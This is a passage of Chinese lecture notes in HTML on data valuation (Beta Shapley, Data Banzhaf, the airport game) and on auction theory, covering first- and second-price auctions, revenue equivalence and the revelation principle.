<li>然后，将这些不同大小联盟的平均边际贡献 <span class="arithmatex">\(\Delta_j(D_i)\)</span> 加起来，再除以 <span class="arithmatex">\(n\)</span>。</li>
</ul>
<div class="admonition info">
<p class="admonition-title">Beta Shapley</p>
<p>在 Data-Shapley 中，数据对任意大小的联盟的贡献是平等对待的。也就是说，一个数据集对小的联盟的贡献和对大的联盟的贡献在 Data-Shapley 中具有相同的权重。然而，一个自然的问题是，当联盟本身已经很大时，此时再加入一个数据集，对联盟的贡献通常而言会比较小，所以对较大联盟的边际贡献应该适当给予降低。因此更进一步，在数据估值中，如果对较大联盟的边际贡献权重适当给予缩小，更加重视对较小联盟的边际贡献，可能对数据集的评估会更加准确。基于此，Beta-Shapley 的定义为：</p>
<div class="arithmatex">\[
\varphi_i^{\text{Beta}} = \frac{1}{n} \sum_{j=0}^{n-1} w_j \Delta_j(D_i)
\]</div>
<p>其中，<span class="arithmatex">\(w_j\)</span> 是一个权重因子，用于调整不同大小联盟的边际贡献在总和中的权重。</p>
</div>
<div class="admonition info">
<p class="admonition-title">Data Banzhaf</p>
<p>Data-Banzhaf 的定义如下：</p>
<div class="arithmatex">\[
\varphi_i^{\text{banz}} = \sum_{S \subseteq D \setminus \{D_i\}} \frac{1}{2^{n-1}} (U(S \cup \{D_i\}) - U(S))
\]</div>
<p>从 Data-Banzhaf 的公式中可以看出，实际上是将 <span class="arithmatex">\(D_i\)</span> 对所有 <span class="arithmatex">\(2^{n-1}\)</span> 个联盟 <span class="arithmatex">\(S \subseteq D \setminus \{D_i\}\)</span> 的贡献取平均。与 Data-Shapley 不同，Data-Banzhaf 对每个单独的联盟的权重是相同的。</p>
<ul>
<li><span class="arithmatex">\(2^{n-1}\)</span>: 表示所有可能的联盟数量。</li>
<li><span class="arithmatex">\(U(S \cup \{D_i\}) - U(S)\)</span>: 表示数据点 <span class="arithmatex">\(D_i\)</span> 对联盟 <span class="arithmatex">\(S\)</span> 的边际贡献。</li>
</ul>
<p>Data-Banzhaf 提供了一种不同的视角，即对随机学习算法的优化进行改进。</p>
</div>
<div class="admonition example">
<p class="admonition-title">多项式时间复杂度游戏</p>
<p><figure markdown="span">
    <img alt="" src="../NOTE/DataMarket/img/ex8.png" width="500" />
</figure></p>
<blockquote>
<p>前面一项单独对空集的贡献提取出来，后面对于每一种j比i小的情况累加，上面的二项式系数是从j-1个挑出k个比j小的，下面的二项式系数是从n-1个挑出k+1个，因为此时的联盟大小是k+1，这是shapley的系数。</p>
</blockquote>
<p>另外一种方法是，将跑道视为分段修建。假设各航空公司的需求已排序，即 <span class="arithmatex">\(c_1 \le c_2 \le \dots \le c_n\)</span>。我们将成本分摊过程分解如下：</p>
<ol>
<li>
<p><strong>第一段 (长度 0 到 <span class="arithmatex">\(c_1\)</span>)</strong>:</p>
<ul>
<li><strong>成本</strong>: <span class="arithmatex">\(c_1\)</span>。</li>
<li><strong>受益者</strong>: 所有 <span class="arithmatex">\(n\)</span> 家公司。</li>
<li><strong>分摊</strong>: 成本由 <span class="arithmatex">\(n\)</span> 家公司平分，每家分摊 <span class="arithmatex">\(\frac{c_1}{n}\)</span>。</li>
</ul>
</li>
<li>
<p><strong>第二段 (长度 <span class="arithmatex">\(c_1\)</span> 到 <span class="arithmatex">\(c_2\)</span>)</strong>:</p>
<ul>
<li><strong>成本</strong>: <span class="arithmatex">\(c_2 - c_1\)</span>。</li>
<li><strong>受益者</strong>: 剩下 <span class="arithmatex">\(n-1\)</span> 家公司。</li>
<li><strong>分摊</strong>: 成本由 <span class="arithmatex">\(n-1\)</span> 家公司平分，每家分摊 <span class="arithmatex">\(\frac{c_2 - c_1}{n-1}\)</span>。</li>
</ul>
</li>
<li>
<p><strong>第 <span class="arithmatex">\(j\)</span> 段 (长度 <span class="arithmatex">\(c_{j-1}\)</span> 到 <span class="arithmatex">\(c_j\)</span>)</strong>:</p>
<ul>
<li><strong>成本</strong>: <span class="arithmatex">\(c_j - c_{j-1}\)</span>。</li>
<li><strong>受益者</strong>: 剩下 <span class="arithmatex">\(n-j+1\)</span> 家公司。</li>
<li><strong>分摊</strong>: 成本由 <span class="arithmatex">\(n-j+1\)</span> 家公司平分，每家分摊 <span class="arithmatex">\(\frac{c_j - c_{j-1}}{n-j+1}\)</span>。</li>
</ul>
</li>
</ol>
<p>... 以此类推，直到最后一段。</p>
<p>航空公司 <span class="arithmatex">\(i\)</span> 需要长度为 <span class="arithmatex">\(c_i\)</span> 的跑道，因此它参与了前 <span class="arithmatex">\(i\)</span> 段的成本分摊。其应付的总成本（即沙普利值）为：</p>
<div class="arithmatex">\[
\varphi_i^{\text{shap}} = \underbrace{\frac{c_1}{n}}_{\text{第1段}} + \underbrace{\frac{c_2 - c_1}{n-1}}_{\text{第2段}} + \underbrace{\frac{c_3 - c_2}{n-2}}_{\text{第3段}} + \dots + \underbrace{\frac{c_i - c_{i-1}}{n-i+1}}_{\text{第i段}}
\]</div>
</div></section><section class="print-page" id="note-datamarket-auction" heading-number="2.2.5.5"><h1 id="note-datamarket-auction-_1">拍卖与机制设计基础<a class="headerlink" href="#note-datamarket-auction-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 6307 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 4 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 22 分钟</p>
</div>
<h2 id="note-datamarket-auction-_2">拍卖理论基础<a class="headerlink" href="#note-datamarket-auction-_2" title="Permanent link">&para;</a></h2>
<div class="admonition info">
<p class="admonition-title">拍卖形式</p>
<ul>
<li>公开拍卖<ul>
<li>英式拍卖：公开升价式拍卖</li>
<li>荷兰式拍卖：公开降价式拍卖</li>
</ul>
</li>
<li>密封拍卖<ul>
<li>第一价格密封出价拍卖，价高者得，支付自己的报价</li>
<li>第二价格密封出价拍卖，价高者得，支付第二高的报价</li>
<li>有的拍卖中会设置保留价格（reserve price），指卖家在拍卖开始前设定的最低出售价格。如果所有报价都低于保留价格，卖家选择不卖出物品。当然有的拍卖也会设置入场费（entry fee），即所有参与者在拍卖开始前需要支付的费用，无论是否赢得拍卖。</li>
</ul>
</li>
<li>反向拍卖（reverse auction）是卖家报价的，在反向拍卖中，买家作为拍卖师通常具有一些采购需求，竞拍者是待采购商品的卖家，买家通过卖家的投标，结合其提供的商品质量决定选择哪些卖家的商品。不难发现，常见的招标就可以使用反向拍卖的方式进行。</li>
</ul>
</div>
<h3 id="note-datamarket-auction-_3">单物品密封拍卖的一般框架<a class="headerlink" href="#note-datamarket-auction-_3" title="Permanent link">&para;</a></h3>
<ul>
<li>一个卖家拥有一个不可分割的物品待出售；</li>
<li>存在 <span class="arithmatex">\(n\)</span> 个潜在买家（竞拍者）<span class="arithmatex">\(N=\{1,2,\dots,n\}\)</span>；<ul>
<li>每个买家 <span class="arithmatex">\(i\)</span> 对物品有一个心理价位（估值）<span class="arithmatex">\(t_i\)</span>，但 <span class="arithmatex">\(t_i\)</span> 对卖家和其他买家来说是不完全信息（即 <span class="arithmatex">\(t_i\)</span> 是买家的类型）；</li>
<li>买家估值的先验概率密度 <span class="arithmatex">\(f_i :[a_i,b_i]\rightarrow\mathbb{R}^+\)</span> 是共同知识，其中 <span class="arithmatex">\(a_i\)</span> 和 <span class="arithmatex">\(b_i\)</span> 是买家 <span class="arithmatex">\(i\)</span> 估值的下界和上界；</li>
<li>假设 <span class="arithmatex">\(f_i\)</span> 连续且 <span class="arithmatex">\(f_i(t_i)&gt;0\)</span> 对所有 <span class="arithmatex">\(t_i \in[a_i,b_i]\)</span> 成立，则 <span class="arithmatex">\(t_i\)</span> 的分布函数 <span class="arithmatex">\(F_i(t_i) = \int_{a_i}^{t_i} f_i(s_i) \, ds_i\)</span>，
    分布函数在 <span class="arithmatex">\(t_i\)</span> 处的值表示买家 <span class="arithmatex">\(i\)</span> 的心理价位小于等于 <span class="arithmatex">\(t_i\)</span> 的概率；</li>
</ul>
</li>
<li>
<p>卖家对物品也有一个估值，表示物品未售出时卖家持有的效用，记为 <span class="arithmatex">\(t_0\)</span>，该信息是共同知识。为简化讨论，假定 <span class="arithmatex">\(t_0=0\)</span>。</p>
</li>
<li>
<p>每个买家对物品的估值是私人信息，但具有先验分布的共同知识。</p>
</li>
<li>每个买家 <span class="arithmatex">\(i\)</span> 的策略是选择一个报价 <span class="arithmatex">\(b_i\)</span>。</li>
<li>卖家没有策略，只需根据给定的拍卖规则（如一价或二价），基于买家的报价 <span class="arithmatex">\(\mathbf{b}=(b_1,\dots,b_n)\)</span>，决定博弈的结果 <span class="arithmatex">\((\mathbf{x},\mathbf{p})\)</span>。</li>
<li>其中，<span class="arithmatex">\(\mathbf{x}\)</span> 是物品的分配规则，<span class="arithmatex">\(x_i(\mathbf{b})\)</span> 表示买家 <span class="arithmatex">\(i\)</span> 在所有竞拍者投标为 <span class="arithmatex">\(\mathbf{b}\)</span> 时获得物品的概率。</li>
<li><span class="arithmatex">\(\mathbf{p}\)</span> 是支付规则，<span class="arithmatex">\(p_i(\mathbf{b})\)</span> 表示买家 <span class="arithmatex">\(i\)</span> 在所有竞拍者投标为 <span class="arithmatex">\(\mathbf{b}\)</span> 时需要支付的价格。在单物品拍卖中，要求</li>
</ul>
<div class="arithmatex">\[
  \sum_{i=1}^{n} x_i(\mathbf{b}) \leqslant 1,
\]</div>
<p>即只有一个物品待出售。如果等于 1，代表物品总会卖出去；如果小于 1，代表卖家可能选择不卖出物品。注意，<span class="arithmatex">\(x_i(\mathbf{b})\)</span> 不一定只取 0 和 1，也可能是一个概率。</p>
<p>给定一个分配结果 <span class="arithmatex">\((x,p)\)</span>，每个买家 <span class="arithmatex">\(i\)</span> 的效用以拟线性效用函数的形式表达为</p>
<div class="arithmatex">\[
  u_i = x_i(b)t_i - p_i(b)
\]</div>
<p>其中 <span class="arithmatex">\(x_i(b)t_i\)</span> 表示买家 <span class="arithmatex">\(i\)</span> 获得物品的期望收益（获得物品的概率乘以物品的效用），<span class="arithmatex">\(p_i(b)\)</span> 表示买家 <span class="arithmatex">\(i\)</span> 需要支付的价格。
注意无论什么类型的拍卖，最终的结果都是由分配规则和支付规则决定。</p>
<h3 id="note-datamarket-auction-_4">单物品第二价格拍卖<a class="headerlink" href="#note-datamarket-auction-_4" title="Permanent link">&para;</a></h3>
<p>首先根据上述讨论形式化第二价格拍卖。在第二价格拍卖中，假设买家投标为 <span class="arithmatex">\(\mathbf{b}=(b_1, \dots, b_n)\)</span>，那么最终的分配规则 <span class="arithmatex">\((\mathbf{x}, \mathbf{p})\)</span> 为</p>
<div class="arithmatex">\[
x_i(\mathbf{b}) = 
\begin{cases} 
1 &amp; \text{如果 } b_i = \max_{j \in N} b_j \\ 
0 &amp; \text{其他情况} 
\end{cases},
\]</div>
<div class="arithmatex">\[
p_i(\mathbf{b}) = 
\begin{cases} 
\max_{j \neq i} b_j &amp; \text{如果 } b_i = \max_{j \in N} b_j \\ 
0 &amp; \text{其他情况} 
\end{cases}.
\]</div>
<p>即报价最高的买家赢得物品，但只需要支付第二高的报价。</p>
<div class="admonition question">
<p class="admonition-title">有多个买家报出相同的最高报价时该如何处理？</p>
<ul>
<li>一方面由于每个买家的估值服从连续分布，因此这种情况的概率为 0；</li>
<li>另一方面即使出现这种情况，卖家也可以随机选择一个报价最高的买家赢得物品打破平局；</li>
<li>如果没有特别说明，都忽略多个买家报出相同最高报价的情况。</li>
</ul>
</div>
<p>第二价格拍卖的博弈均衡非常简单且具有良好的性质：</p>
<div class="admonition tip">
<p class="admonition-title">二价拍卖诚实占优</p>
<p>在单物品第二价格拍卖中，即每个竞拍者将自身估值 <span class="arithmatex">\(t_i\)</span> 作为报价 <span class="arithmatex">\(b_i\)</span> 得到的 <span class="arithmatex">\(\mathbf{b}=(t_1, \dots, t_n)\)</span> 是（弱）占优策略均衡。简而言之，所有竞拍者诚实报价是（弱）占优策略均衡。</p>
</div>
<p>诚实报价是占优策略是二价拍卖的一个非常重要的性质：</p>
<ul>
<li>竞拍者参与二价拍卖时的策略非常简单：只需要将自己的估值作为报价即可，不需要考虑与其他竞拍者的复杂关系；</li>
<li>另一方面，诚实报价可以显示竞拍者的真实估值，从而打破信息不对称，卖家只需直接选出报价最高的竞拍者即可实现社会福利最大化；</li>
<li>因为社会福利就等于拥有物品的人对物品的估值，因此最大化社会福利就要将物品转移到对其估值最高的人手中。</li>
</ul>
<div class="admonition success">
<p class="admonition-title">证明</p>
<p>考虑任意的竞拍者 <span class="arithmatex">\(i\)</span>，设 <span class="arithmatex">\(p_i = \max_{j \neq i} b_j\)</span>，即 <span class="arithmatex">\(p_i\)</span> 是除了 <span class="arithmatex">\(i\)</span> 之外的所有竞拍者的最高报价。分三种情况讨论：</p>
<p><figure markdown>
<img alt="二价拍卖博弈均衡" src="../NOTE/DataMarket/img/second-price-auction.png" width="500" />
</figure></p>
<ol>
<li>如果 <span class="arithmatex">\(t_i &gt; p_i\)</span>，那么 <span class="arithmatex">\(i\)</span> 如果报价 <span class="arithmatex">\(b_i=t_i\)</span> 就会赢得拍卖并支付 <span class="arithmatex">\(p_i\)</span>，效用 <span class="arithmatex">\(t_i - p_i &gt; 0\)</span>。考虑策略的偏离，如果选择报价提高至 <span class="arithmatex">\(b_i' &gt; t_i\)</span>，结果没有任何改变；如果报价降低至 <span class="arithmatex">\(t_i &gt; b_i' \ge p_i\)</span>，结果仍然一致；但如果降低报价至 <span class="arithmatex">\(b_i' &lt; p_i\)</span>，那么 <span class="arithmatex">\(i\)</span> 将不再赢得拍卖，因此 <span class="arithmatex">\(i\)</span> 的效用将变为 0，故 <span class="arithmatex">\(t_i&gt;p_i\)</span> 时诚实报价是（弱）占优策略；</li>
<li>如果 <span class="arithmatex">\(t_i &lt; p_i\)</span>，那么 <span class="arithmatex">\(i\)</span> 如果报价 <span class="arithmatex">\(b_i=t_i\)</span> 不会赢得拍卖，效用 0。考虑策略的偏离，如果报价降低至 <span class="arithmatex">\(b_i' &lt; t_i\)</span>，结果没有任何改变；如果报价提高至 <span class="arithmatex">\(t_i &lt; b_i' &lt; p_i\)</span>，结果仍然一致；但如果报价提高至 <span class="arithmatex">\(b_i' \ge p_i\)</span>，那么 <span class="arithmatex">\(i\)</span> 将赢得拍卖并支付 <span class="arithmatex">\(p_i\)</span>，因此 <span class="arithmatex">\(i\)</span> 的效用将变为 <span class="arithmatex">\(t_i - p_i &lt; 0\)</span>，故 <span class="arithmatex">\(t_i &lt; p_i\)</span> 时诚实报价是（弱）占优策略；</li>
<li>如果 <span class="arithmatex">\(t_i=p_i\)</span>，事实上拍卖的输赢带给 <span class="arithmatex">\(i\)</span> 的效用都是 0，因此 <span class="arithmatex">\(i\)</span> 无论报价多少都不会影响效用。</li>
</ol>
<p>综上，对于任意的竞拍者 <span class="arithmatex">\(i\)</span>，诚实报价是（弱）占优策略均衡。</p>
<div class="admonition warning">
<p class="admonition-title">二价拍卖的缺陷</p>
<p>尽管第二价格拍卖具有如此好的性质，但在通常的印象中似乎并不如第一价格拍卖常见。一个重要的原因是，卖家可以操纵第二价格拍卖，通过向最高报价者谎称一个比较高的第二价格来提高自己的收益：</p>
<p>例如在第二价格拍卖中，你是最高价格的报价者，你的报价为 100 元，第二高报价为 80 元，因此你赢得拍卖并支付 80 元；</p>
<p>但因为是密封拍卖，你无法得知第二高报价的准确数值，如果卖家告诉
你第二高报价是 90 元，你也无从得知 90 元是不是真的第二高报价，但
卖家掌握这一信息，从而可以从信息操纵中获得更高的收益</p>
</div>
</div>
<h3 id="note-datamarket-auction-_5">第一价格拍卖<a class="headerlink" href="#note-datamarket-auction-_5" title="Permanent link">&para;</a></h3>
<p>我们自然希望一价拍卖能有二价拍卖那样简单的结果，但只需要稍作分析就会发现一价拍卖的博弈结果并不那么简单。</p>
<p>首先，在一价拍卖中，假设买家投标为 <span class="arithmatex">\(\mathbf{b}=(b_1, \dots, b_n)\)</span>，那么最终的分配规则 <span class="arithmatex">\((\mathbf{x}, \mathbf{p})\)</span> 为</p>
<div class="arithmatex">\[
x_i(\mathbf{b}) = 
\begin{cases} 
1 &amp; \text{如果 } b_i = \max_{j \in N} b_j \\ 
0 &amp; \text{其他情况} 
\end{cases},
\]</div>
<div class="arithmatex">\[
p_i(\mathbf{b}) = 
\begin{cases} 
b_i &amp; \text{如果 } b_i = \max_{j \in N} b_j \\ 
0 &amp; \text{其他情况} 
\end{cases}.
\]</div>
<div class="admonition warning">
<p class="admonition-title">第一价格拍卖不是诚实占优的</p>
<ul>
<li>如果一价拍卖中竞拍者报出自己的估值，那么赢下拍卖后的支付就是自己的估值，因此效用为 0，与没有赢下拍卖一致，因此从直观上看一价拍卖的参与人有动机报出低于自己估值的报价。</li>
<li>严格来说，代入二价拍卖诚实报价占优的证明，一价拍卖在 <span class="arithmatex">\(t_i &gt; p_i\)</span> 时（报价高于第二高价格时），如果将报价从 <span class="arithmatex">\(t_i\)</span> 下调到 <span class="arithmatex">\(p_i\)</span> 和 <span class="arithmatex">\(t_i\)</span> 之间，竞拍者 <span class="arithmatex">\(i\)</span> 仍然可以赢下拍卖，但效用可以提高到大于 0 的值，因此一价拍卖并非诚实报价是占优策略，而是有动机报出低于自己估值的报价；</li>
<li>由此可以看出二价拍卖诚实的关键：报价与自己的估值无直接关联；</li>
<li>
<div class="admonition question">
<p class="admonition-title">问题：三价拍卖是否诚实？</p>
三价拍卖也不是诚实占优的。</div>
</li>
</ul>
</div>
<p>因此接下来尝试从贝叶斯纳什均衡的角度给出一价拍卖的不完全信息静态博弈结果。下面计算一价拍卖的贝叶斯纳什均衡，一般的结论推导比较复杂，因此只考虑非常简单的情况的计算。</p>
<div class="admonition example">
<p class="admonition-title">一价拍卖的贝叶斯纳什均衡</p>
<p>假设只有两个竞拍者，并且两个竞拍者的估值是独立的，且都服从 <span class="arithmatex">\([0,1]\)</span> 上的均匀分布。两个竞拍者的真实估值记为 <span class="arithmatex">\(t_1, t_2\)</span>，试求解博弈的纯策略贝叶斯纳什均衡。</p>
<p>这一博弈对应类型空间连续且策略空间连续的情况，因此比之前介绍的例子都要复杂。自然地，可以考虑具有如下性质的特殊均衡：</p>
<ul>
<li>纯策略均衡；</li>
<li>由于两个竞拍者是对称的，因此考虑对称均衡，即二者的出价策略都是当自己的估值为 <span class="arithmatex">\(t_i\)</span> 时出价 <span class="arithmatex">\(\beta(t_i)\)</span>；</li>
<li>假设 <span class="arithmatex">\(\beta\)</span> 是增函数，即估值越大报价越高；</li>
<li><span class="arithmatex">\(\beta(0) = 0\)</span>，即估值为 0 的竞拍者出价也为 0。</li>
</ul>
<p>回顾纯策略均衡的求解是寻找对方策略的最优反应，因此首先写出当竞拍者 1 报价 <span class="arithmatex">\(b_1\)</span>，竞拍者 2 报价 <span class="arithmatex">\(\beta(t_2)\)</span> 时竞拍者 1 的效用为：</p>
<div class="arithmatex">\[
(t_1 - b_1)\mathbb{P}(b_1 &gt; \beta(t_2)) = (t_1 - b_1) \cdot \beta^{-1}(b_1)
\]</div>
<p>对 <span class="arithmatex">\(b_1\)</span> 求导有取极大值的必要条件为</p>
<div class="arithmatex">\[
-\beta^{-1}(b_1) + \frac{t_1 - b_1}{\beta'(\beta^{-1}(b_1))} = 0.
\]</div>
<p>已知考虑对称均衡，故均衡时 <span class="arithmatex">\(b_1 = \beta(t_1)\)</span>，代入上式有</p>
<div class="arithmatex">\[
t_1 = t_1\beta'(t_1) + \beta(t_1),
\]</div>
<p>上式对任意的 <span class="arithmatex">\(t_1\)</span> 都成立，可以改写为</p>
<div class="arithmatex">\[
t = (t\beta(t))'.
\]</div>
<p>不难解得 <span class="arithmatex">\(\beta(t_1) = t_1/2\)</span>，这就解出了一价拍卖的对称递增均衡。当然上述一阶条件只是极值的必要条件，还需要检验充分性，此处省略。</p>
</div>
<h3 id="note-datamarket-auction-_6">收入等价定理<a class="headerlink" href="#note-datamarket-auction-_6" title="Permanent link">&para;</a></h3>
<p>在第二价格拍卖中，竞拍者诚实报价是占优策略，但赢得拍卖的竞拍者只只需支付第二高报价；而在第一价格拍卖中，竞拍者会降低自己的报价，但赢得拍卖的竞拍者需要支付自己的报价（即最高的报价）。自然的问题是：<strong>在这两种拍卖中，卖家的期望收入哪种拍卖会更高呢？</strong></p>
<p>在只有两个竞拍者，且两个个竞拍者的估值独立同分布于 <span class="arithmatex">\([0,1]\)</span> 上的均匀分布的情况下：</p>
<ul>
<li><strong>一价拍卖</strong>：竞拍者 <span class="arithmatex">\(i\)</span> 的均衡报价策略为 <span class="arithmatex">\(b_i = t_i/2\)</span>。竞拍者 1 赢得拍卖的概率为 <span class="arithmatex">\(\mathbb{P}(t_1/2 &gt; t_2/2) = \mathbb{P}(t_2 &lt; t_1) = t_1\)</span>。因此竞拍者 1 的期望支付为 <span class="arithmatex">\(t_1 \cdot t_1/2 = t_1^2/2\)</span>。站在卖家的角度，<span class="arithmatex">\(t_1\)</span> 是不确定的，因此卖家认为竞拍者 1 的期望支付为</li>
</ul>
<div class="arithmatex">\[
    \int_0^1 \frac{t_1^2}{2} dt_1 = \frac{1}{6}.
\]</div>
<div class="admonition info">
<p class="admonition-title">另一种计算方式</p>
<p>在只有两个竞拍者，且两个竞拍者的估值独立同分布于 <span class="arithmatex">\([0,1]\)</span> 上的均匀分布的情况下，可以直接写出一价拍卖选择对称递增均衡下的期望收益等于</p>
<div class="arithmatex">\[
\mathbb{E}[\max(\beta(t_1), \beta(t_2))] = \mathbb{E}\left[\frac{\max(t_1, t_2)}{2}\right].
\]</div>
<p><span class="arithmatex">\(\max(t_1, t_2)\)</span> 是次序统计量，对应的分布函数为</p>
<div class="arithmatex">\[
F(t) = \mathbb{P}(\max(t_1, t_2) &lt; t) = \mathbb{P}(t_1 &lt; t) \cdot \mathbb{P}(t_2 &lt; t) = t^2,
\]</div>
<p>故对应的密度函数为 <span class="arithmatex">\(f(t) = 2t\)</span>，因此收益期望值等于</p>
<div class="arithmatex">\[
\frac{1}{2} \cdot \mathbb{E}[\max(t_1, t_2)] = \frac{1}{2}\int_0^1 t \cdot 2t dt = \frac{1}{3}.
\]</div>
</div>
<ul>
<li><strong>二价拍卖</strong>：根据诚实报价占优以及支付第二高报价可知卖家的期望收入</li>
</ul>
<div class="arithmatex">\[
    \mathbb{E}[\min(t_1, t_2)]
\]</div>
<p><span class="arithmatex">\(\min(t_1, t_2)\)</span> 是次序统计量，对应的分布函数为</p>
<div class="arithmatex">\[
   \mathbb{P}(\min(t_1, t_2) &lt; t) = 1 - \mathbb{P}(\min(t_1, t_2) &gt; t) = 1 - \mathbb{P}(t_1 &gt; t) \cdot \mathbb{P}(t_2 &gt; t) = 1 - (1-t)^2.
\]</div>
<p>对应的密度函数为</p>
<div class="arithmatex">\[
   f(t) = 2(1-t).
\]</div>
<p>故</p>
<div class="arithmatex">\[
   \mathbb{E}[\min(t_1, t_2)] = \int_0^1 t \cdot 2(1-t) dt = \frac{1}{3}.
\]</div>
<p>因此对于卖家而言，在上述情况下选择第一和第二价格拍卖，最终得到的期望收益无差别。事实上这井不是巧合，而是下面这一定理的一个特例：</p>
<div class="admonition tip">
<p class="admonition-title">收入等价定理</p>
<p>假设竞拍者估价独立同分布，那么只要估价为 0 的竞拍者的期望支付为 0，且拍卖规则为报价最高者得到物品，则拍卖的递增对称均衡都会使得卖家获得相等都的期望收入。</p>
</div>
<div class="admonition definition">
<p class="admonition-title">递增对称均衡</p>
<p>拆解为三个部分理解：</p>
<ol>
<li><strong>均衡 (Equilibrium)</strong>: 指的是"贝叶斯纳什均衡"。在此状态下，没有任何一个参与者有动机单方面改变自己的策略，因为改变策略不会带来更好的收益。</li>
<li><strong>对称 (Symmetric)</strong>: 指的是所有参与者都使用相同的策略函数。在拍卖的例子里，一个对称的策略就是，无论竞拍者是谁，都会使用同一个函数 <span class="arithmatex">\(\beta(t)\)</span> 来根据自己的估值 <span class="arithmatex">\(t\)</span> 决定报价 <span class="arithmatex">\(b\)</span>。</li>
<li><strong>递增 (Increasing)</strong>: 指的是策略函数 <span class="arithmatex">\(\beta(t)\)</span> 是一个单调递增函数。这意味着，对物品的估值 <span class="arithmatex">\(t\)</span> 越高，竞拍者出的报价 <span class="arithmatex">\(b\)</span> 就越高。这非常符合直觉。</li>
</ol>
</div>
<p>递增对称均衡描述了这样一种博弈的稳定状态：所有参与者都采用同一个单调递增的策略函数来出价，并且在这种情况下，没有人愿意单方面改变自己的策略。在一价拍卖的例子中，我们求解出的 <span class="arithmatex">\(\beta(t) = t/2\)</span> 就是一个递增对称均衡。</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>求卖家期望收益可以求每个玩家期望支付乘玩家个数，也可以直接写出卖家期望收益的表达式。</p>
</div>
<h2 id="note-datamarket-auction-_7">机制设计基础<a class="headerlink" href="#note-datamarket-auction-_7" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">机制</p>
<p>对一个不完全信息博弈，一个机制是一个二元组 <span class="arithmatex">\((S, M)\)</span>，其中 <span class="arithmatex">\(S = S_1 \times \cdots \times S_n\)</span> 是所有参与人可选的纯策略集合，<span class="arithmatex">\(M\)</span> 是一个将所有参与人的纯策略向量 <span class="arithmatex">\((s_1, \ldots, s_n) \in S\)</span> 映射到结果集 <span class="arithmatex">\(O\)</span> 上的一个概率分布的一个映射。</p>
<p>如果一个机制是确定性的 (deterministic)，那么对于每个行动向量，机制 <span class="arithmatex">\(M\)</span> 将其行动映射到一个确定的结果 <span class="arithmatex">\(o_i \in O\)</span> 上。</p>
<p>例如，一个单物品密封拍卖机制是将买家的投标向量映射到一个结果 <span class="arithmatex">\((x, p)\)</span> 上的机制，其中 <span class="arithmatex">\(x\)</span> 是分配规则，<span class="arithmatex">\(p\)</span> 是支付规则。</p>
<p>上述定义不仅适用于拍卖机制，只要针对不完全信息博弈，并且将参与人策略映射到结果，就是符合上述机制定义的。</p>
</div>
<h3 id="note-datamarket-auction-_8">直接显示机制与显示原理<a class="headerlink" href="#note-datamarket-auction-_8" title="Permanent link">&para;</a></h3>
<p>为了介绍显示原理，首先需要定义如下两个基本概念：</p>
<div class="admonition definition">
<p class="admonition-title">直接显示机制</p>
<p>对于一个机制 <span class="arithmatex">\((S, M)\)</span>，如果：</p>
<ol>
<li>对每个参与人 <span class="arithmatex">\(i\)</span> 都有 <span class="arithmatex">\(S_i = T_i\)</span>，即每个参与人的行动就是报示自己的类型，则这一机制称为直接显示机制 (direct revelation mechanism) 或直接机制 (direct mechanism)；</li>
<li>如果每个参与人如实报告自己的类型时的行动向量 <span class="arithmatex">\(\mathbf{s} = (t_1, \ldots, t_n)\)</span> 是博弈的纳什均衡，则称这一机制是激励相容的，或者说是诚实的 (truthful)。更详细地，如果 <span class="arithmatex">\(\mathbf{s}\)</span> 是占优策略均衡，则称这一机制是占优策略激励相容 (dominant-strategy incentive compatible, DSIC) 的。如果 <span class="arithmatex">\(\mathbf{s}\)</span> 是贝叶斯纳什均衡，则称这一机制是贝叶斯激励相容 (Bayesian incentive compatible, BIC) 的。</li>
</ol>
</div>
<p>不难发现，如果单物品密封价格拍卖中各参与人的类型（即估值）集合为 <span class="arithmatex">\([0, +\infty)\)</span>，则每个参与人的行动集合（报价）也是 <span class="arithmatex">\([0, +\infty)\)</span>，故满足直接显示机制。此外，由于二价拍卖下诚实报价是占优策略均衡，故二价拍卖是占优策略激励相容的。</p>
<div class="admonition tip">
<p class="admonition-title">显示原理</p>
<p>给定任意一个机制及其占优策略均衡（或贝叶斯纳什均衡），都可以找到一个激励相容的直接机制，使得该机制均衡下的结果和原机制均衡下对应的结果一致。</p>
</div>
<p>可以先用一价拍卖的例子体会上述定理的含义。回忆只有两个竞拍者，且两个竞拍者的估值独立同分布于 <span class="arithmatex">\([0,1]\)</span> 上的均匀分布的情况下，一价拍卖选择对称递增均衡为 <span class="arithmatex">\(\beta(t) = t/2\)</span>。</p>
<p>如果此时机制变为：报价最高者获得物品，但只需要支付最高报价的一半，那么该机制下诚实报价就可以体现到和原机制相同的完全一致的结果。下图给出了这一思想一般化的证明示意。</p>
<figure>
<img alt="" src="../NOTE/DataMarket/img/revelation.png" width="500" />
</figure>
<p>通俗地说，机制设计者为参与者完成了均衡求解的任务，因此参与者只需输入自己的真实类型，就能获得与原机制均衡相同的结果。激励相容的直接机制因此能够实现与原机制一致的结果。</p>
<p>由此可见，显示原理是一个非常巧妙的定理，其作用非常显著：在后续的机制设计问题中，我们只需考虑所有参与者在均衡下如实报告自己类型的机制即可；</p>
<ul>
